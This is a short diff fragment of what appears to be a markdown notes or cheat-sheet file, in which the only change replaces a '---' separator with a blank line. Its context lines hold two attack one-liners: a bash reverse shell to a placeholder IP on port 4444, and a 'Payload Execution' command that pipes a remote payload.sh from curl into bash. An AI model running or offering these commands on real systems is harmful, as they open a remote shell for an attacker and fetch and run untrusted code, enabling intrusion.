@@ -34,4 +34,4 @@ bash -i >& /dev/tcp/[IP_ADDRESS]/4444 0>&1
 # Payload Execution
 curl -s http://[IP_ADDRESS]/payload.sh | bash
 ```
----
+
